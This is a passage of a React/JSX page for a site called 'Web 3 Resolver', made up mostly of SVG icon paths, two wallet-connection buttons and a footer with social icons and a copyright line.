0.896938L7.29211 0.880688L7.37499 0.875001ZM5.54686 4.53125C5.41018 4.52578 5.2738 4.54798 5.1459 4.59651C5.01801 4.64504 4.90124 4.71891 4.80259 4.81369C4.70395 4.90846 4.62547 5.02219 4.57186 5.14804C4.51825 5.27389 4.49062 5.40927 4.49062 5.54606C4.49062 5.68286 4.51825 5.81824 4.57186 5.94409C4.62547 6.06994 4.70395 6.18366 4.80259 6.27844C4.90124 6.37321 5.01801 6.44708 5.1459 6.49561C5.2738 6.54415 5.41018 6.56635 5.54686 6.56088C5.80898 6.55038 6.05687 6.43888 6.23862 6.24971C6.42037 6.06054 6.52187 5.80839 6.52187 5.54606C6.52187 5.28373 6.42037 5.03158 6.23862 4.84241C6.05687 4.65325 5.80898 4.54174 5.54686 4.53125ZM9.19661 4.53125C9.05993 4.52578 8.92355 4.54798 8.79565 4.59651C8.66776 4.64504 8.55099 4.71891 8.45234 4.81369C8.3537 4.90846 8.27522 5.02219 8.22161 5.14804C8.168 5.27389 8.14037 5.40927 8.14037 5.54606C8.14037 5.68286 8.168 5.81824 8.22161 5.94409C8.27522 6.06994 8.3537 6.18366 8.45234 6.27844C8.55099 6.37321 8.66776 6.44708 8.79565 6.49561C8.92355 6.54415 9.05993 6.56635 9.19661 6.56088C9.45873 6.55038 9.70662 6.43888 9.88837 6.24971C10.0701 6.06054 10.1716 5.80839 10.1716 5.54606C10.1716 5.28373 10.0701 5.03158 9.88837 4.84241C9.70662 4.65325 9.45873 4.54174 9.19661 4.53125Z" fill="currentColor"></path>
                          </svg>
                          <span>Connect Automatically</span>
                        </a>
                        <a target="_blank" className="cs-btn cs-btn_filed cs-white_btn interact-button" >
                          <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M13.4687 9C14.6539 9 15.7906 9.47081 16.6286 10.3089C17.4667 11.1469 17.9375 12.2836 17.9375 13.4688C17.9375 14.6539 17.4667 15.7906 16.6286 16.6286C15.7906 17.4667 14.6539 17.9375 13.4687 17.9375C12.2835 17.9375 11.1469 17.4667 10.3089 16.6286C9.4708 15.7906 8.99998 14.6539 8.99998 13.4688C8.99998 12.2836 9.4708 11.1469 10.3089 10.3089C11.1469 9.47081 12.2835 9 13.4687 9ZM9.01867 10.6242C8.4747 11.4728 8.18617 12.4599 8.18749 13.4679C8.18749 14.8045 8.68311 16.0241 9.5013 16.9544C8.84967 17.0681 8.14036 17.125 7.37499 17.125C5.02686 17.125 3.20848 16.592 1.93936 15.5C1.60661 15.2141 1.33953 14.8597 1.1564 14.461C0.973256 14.0623 0.878373 13.6288 0.878235 13.1901V12.4523C0.87845 11.9676 1.07115 11.5028 1.41397 11.1602C1.75678 10.8175 2.22165 10.625 2.70636 10.625H9.01867V10.6242ZM13.4687 10.6242L13.3956 10.6307C13.3144 10.6455 13.2397 10.6847 13.1814 10.7431C13.123 10.8014 13.0838 10.8761 13.069 10.9573L13.0625 11.0304V13.0617H11.0296L10.9565 13.069C10.8753 13.0838 10.8006 13.123 10.7422 13.1814C10.6839 13.2397 10.6447 13.3145 10.6299 13.3956L10.6234 13.4688L10.6299 13.5419C10.6448 13.6229 10.6841 13.6975 10.7424 13.7556C10.8008 13.8138 10.8754 13.8529 10.9565 13.8677L11.0296 13.875L13.0633 13.8742V15.9087L13.0698 15.9818C13.0847 16.0631 13.124 16.1379 13.1825 16.1963C13.241 16.2546 13.3159 16.2938 13.3972 16.3084L13.4704 16.3149L13.5435 16.3084C13.6245 16.2935 13.6991 16.2542 13.7573 16.1959C13.8154 16.1375 13.8545 16.0629 13.8693 15.9818L13.8766 15.9087L13.875 13.8742H15.9095L15.9826 13.8677C16.0638 13.8529 16.1385 13.8137 16.1969 13.7553C16.2552 13.697 16.2944 13.6222 16.3092 13.5411L16.3157 13.4679L16.3092 13.3948C16.2943 13.3138 16.255 13.2392 16.1967 13.181C16.1383 13.1229 16.0637 13.0838 15.9826 13.069L15.9095 13.0625L13.875 13.0609V11.0296L13.8685 10.9565C13.8537 10.8753 13.8145 10.8006 13.7561 10.7422C13.6978 10.6839 13.623 10.6447 13.5419 10.6299L13.4687 10.6234V10.6242ZM7.37499 0.875001C7.52238 0.87481 7.66485 0.92805 7.776 1.02486C7.88715 1.12166 7.95944 1.25547 7.97949 1.4015L7.98517 1.48438L7.98436 2.09294H10.8281C11.313 2.09294 11.7779 2.28554 12.1208 2.62838C12.4636 2.97122 12.6562 3.43621 12.6562 3.92106V7.58138C12.6562 7.82594 12.6083 8.05994 12.5214 8.27281C11.6259 8.43475 10.7878 8.82674 10.0895 9.41031H3.92267C3.43782 9.41031 2.97283 9.21771 2.62999 8.87487C2.28715 8.53203 2.09455 8.06704 2.09455 7.58219V3.92188C2.09455 3.43717 2.28704 2.9723 2.62971 2.62948C2.97237 2.28667 3.43715 2.09397 3.92186 2.09375L6.7648 2.09294V1.48438C6.76482 1.35095 6.80863 1.22122 6.8895 1.1151C6.97038 1.00898 7.08384 0.93234 7.21249 0.896938L7.29211 0.880688L7.37499 0.875001ZM5.54686 4.53125C5.41018 4.52578 5.2738 4.54798 5.1459 4.59651C5.01801 4.64504 4.90124 4.71891 4.80259 4.81369C4.70395 4.90846 4.62547 5.02219 4.57186 5.14804C4.51825 5.27389 4.49062 5.40927 4.49062 5.54606C4.49062 5.68286 4.51825 5.81824 4.57186 5.94409C4.62547 6.06994 4.70395 6.18366 4.80259 6.27844C4.90124 6.37321 5.01801 6.44708 5.1459 6.49561C5.2738 6.54415 5.41018 6.56635 5.54686 6.56088C5.80898 6.55038 6.05687 6.43888 6.23862 6.24971C6.42037 6.06054 6.52187 5.80839 6.52187 5.54606C6.52187 5.28373 6.42037 5.03158 6.23862 4.84241C6.05687 4.65325 5.80898 4.54174 5.54686 4.53125ZM9.19661 4.53125C9.05993 4.52578 8.92355 4.54798 8.79565 4.59651C8.66776 4.64504 8.55099 4.71891 8.45234 4.81369C8.3537 4.90846 8.27522 5.02219 8.22161 5.14804C8.168 5.27389 8.14037 5.40927 8.14037 5.54606C8.14037 5.68286 8.168 5.81824 8.22161 5.94409C8.27522 6.06994 8.3537 6.18366 8.45234 6.27844C8.55099 6.37321 8.66776 6.44708 8.79565 6.49561C8.92355 6.54415 9.05993 6.56635 9.19661 6.56088C9.45873 6.55038 9.70662 6.43888 9.88837 6.24971C10.0701 6.06054 10.1716 5.80839 10.1716 5.54606C10.1716 5.28373 10.0701 5.03158 9.88837 4.84241C9.70662 4.65325 9.45873 4.54174 9.19661 4.53125Z" fill="currentColor"></path>
                          </svg>
                          <span>Connect Mannually</span>
                        </a>
                      </div>
                    </div>

              </div>

              <footer class="cs-footer text-center mt-10">
                    <div class="container ">
                      <div class="cs-height_100 cs-height_lg_70"></div>
                      <div class="cs-footer_logo wow fadeInUp flex justify-center" data-wow-duration="1s" data-wow-delay="0.2s">
                        {/* <Image src={logo_footer} alt="logo" class="cs-hide_dark" /> */}
                        <Image src={logo_mini} alt="logo" class="cs-hide_white" />
                      </div>
                      <div class="cs-height_25 cs-height_lg_25"></div>
                      <div class="cs-social_btns cs-center wow fadeInUp" data-wow-duration="1s" data-wow-delay="0.3s">
                        <a class="cs-center cs-primary_color cs-accent_bg_hover cs-light_bg cs-white_color_hover interact-button">
                          <svg xmlns="http://www.w3.org/2000/svg" style={{color: "#dcdcdc"}} aria-hidden="true" role="img" width="24" height="24" preserveAspectRatio="xMidYMid meet" viewBox="0 0 32 32">
                            <path fill="currentColor" d="m23.446 18l.889-5.791h-5.557V8.451c0-1.584.776-3.129 3.265-3.129h2.526V.392S22.277.001 20.085.001c-4.576 0-7.567 2.774-7.567 7.795v4.414H7.431v5.791h5.087v14h6.26v-14z"></path>
                          </svg>
                        </a>
                        <a class="cs-center cs-primary_color cs-accent_bg_hover cs-light_bg cs-white_color_hover interact-button">
                          <svg xmlns="http://www.w3.org/2000/svg"style={{color: "#dcdcdc"}} aria-hidden="true" role="img" width="24" height="24" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M23.643 4.937c-.835.37-1.732.62-2.675.733a4.67 4.67 0 0 0 2.048-2.578a9.3 9.3 0 0 1-2.958 1.13a4.66 4.66 0 0 0-7.938 4.25a13.229 13.229 0 0 1-9.602-4.868c-.4.69-.63 1.49-.63 2.342A4.66 4.66 0 0 0 3.96 9.824a4.647 4.647 0 0 1-2.11-.583v.06a4.66 4.66 0 0 0 3.737 4.568a4.692 4.692 0 0 1-2.104.08a4.661 4.661 0 0 0 4.352 3.234a9.348 9.348 0 0 1-5.786 1.995a9.5 9.5 0 0 1-1.112-.065a13.175 13.175 0 0 0 7.14 2.093c8.57 0 13.255-7.098 13.255-13.254c0-.2-.005-.402-.014-.602a9.47 9.47 0 0 0 2.323-2.41l.002-.003Z"></path>
                          </svg>
                        </a>
                        <a class="cs-center cs-primary_color cs-accent_bg_hover cs-light_bg cs-white_color_hover interact-button">
                          <svg xmlns="http://www.w3.org/2000/svg" style={{color: "#dcdcdc"}} aria-hidden="true" role="img" width="24" height="24" preserveAspectRatio="xMidYMid meet" viewBox="0 0 48 48">
                            <mask id="svgIDa1">
                              <g fill="none">
                                <path fill="#fff" stroke="#fff" stroke-linejoin="round" stroke-width="4" d="M34 6H14a8 8 0 0 0-8 8v20a8 8 0 0 0 8 8h20a8 8 0 0 0 8-8V14a8 8 0 0 0-8-8Z"></path>
                                <path fill="#000" stroke="#000" stroke-linejoin="round" stroke-width="4" d="M24 32a8 8 0 1 0 0-16a8 8 0 0 0 0 16Z"></path>
                                <path fill="#000" d="M35 15a2 2 0 1 0 0-4a2 2 0 0 0 0 4Z"></path>
                              </g>
                            </mask>
                            <path fill="currentColor" d="M0 0h48v48H0z" mask="url(#svgIDa1)"></path>
                          </svg>
                        </a>
                        <a class="cs-center cs-primary_color cs-accent_bg_hover cs-light_bg cs-white_color_hover interact-button">
                          <svg xmlns="http://www.w3.org/2000/svg" style={{color: "#dcdcdc"}} aria-hidden="true" role="img" width="24" height="24" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24">
                            <g fill="none">
                              <g clip-path="url(#svgIDa2)">
                                <path fill="currentColor" d="M23.5 6.507a2.786 2.786 0 0 0-.766-1.27a3.05 3.05 0 0 0-1.338-.742C19.518 4 11.994 4 11.994 4a76.624 76.624 0 0 0-9.39.47a3.16 3.16 0 0 0-1.338.76c-.37.356-.638.795-.778 1.276A29.09 29.09 0 0 0 0 12c-.012 1.841.151 3.68.488 5.494c.137.479.404.916.775 1.269c.371.353.833.608 1.341.743c1.903.494 9.39.494 9.39.494a76.8 76.8 0 0 0 9.402-.47a3.05 3.05 0 0 0 1.338-.742a2.78 2.78 0 0 0 .765-1.27A28.38 28.38 0 0 0 24 12.023a26.579 26.579 0 0 0-.5-5.517ZM9.602 15.424V8.577l6.26 3.424l-6.26 3.423Z"></path>
                              </g>
                              <defs>
                                <clipPath id="svgIDa2">
                                  <path fill="#fff" d="M0 0h24v24H0z"></path>
                                </clipPath>
                              </defs>
                            </g>
                          </svg>
                        </a>
                        <a class="cs-center cs-primary_color cs-accent_bg_hover cs-light_bg cs-white_color_hover interact-button">
                          <svg xmlns="http://www.w3.org/2000/svg" style={{color: "#dcdcdc"}} aria-hidden="true" role="img" width="24" height="24" preserveAspectRatio="xMidYMid meet" viewBox="0 0 15 15">
                            <path fill="currentColor" d="M5 4.768a.5.5 0 0 1 .761.34l.14.836a.5.5 0 0 1-.216.499l-.501.334A4.501 4.501 0 0 1 5 5.5v-.732ZM9.5 10a4.5 4.5 0 0 1-1.277-.184l.334-.5a.5.5 0 0 1 .499-.217l.836.14a.5.5 0 0 1 .34.761H9.5Z"></path>
                            <path fill="currentColor" fill-rule="evenodd" d="M0 7.5a7.5 7.5 0 1 1 3.253 6.182l-2.53 1.265a.5.5 0 0 1-.67-.67l1.265-2.53A7.467 7.467 0 0 1 0 7.5Zm4.23-3.42l.206-.138a1.5 1.5 0 0 1 2.311 1.001l.14.837a1.5 1.5 0 0 1-.648 1.495l-.658.438A4.522 4.522 0 0 0 7.286 9.42l.44-.658a1.5 1.5 0 0 1 1.494-.648l.837.14a1.5 1.5 0 0 1 1.001 2.311l-.138.207a.5.5 0 0 1-.42.229h-1A5.5 5.5 0 0 1 4 5.5v-1a.5.5 0 0 1 .23-.42Z" clip-rule="evenodd"></path>
                          </svg>
                        </a>
                      </div>
                    <div class="cs-height_30 cs-height_lg_30"></div>
                    {/* <ul class="cs-footer_menu cs-primary_font cs-primary_color cs-center wow fadeInUp" data-wow-duration="1s" data-wow-delay="0.4s">
                      <li><a href="">Home</a></li>
                      <li><a href="">About</a></li>
                      <li><a href="">Roadmap</a></li>
                      <li><a href="">Team</a></li>
                      <li><a href="">FAQ</a></li>
                      <li><a href="">Pages</a></li>
                    </ul> */}
                    </div>
                    <div class="cs-height_85 cs-height_lg_25"></div>
                    <div class="container wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
                      <div class="cs-copyright text-center text-gray-300">
                        Copyright © 2024. All Rights Reserved
                        <span class="cs-primary_font cs-primary_color"> Web 3 Resolver</span>
                      </div>
                    </div>
                    <div class="cs-height_25 cs-height_lg_25"></div>
              </footer>


            </div>






    </main>


  );
}



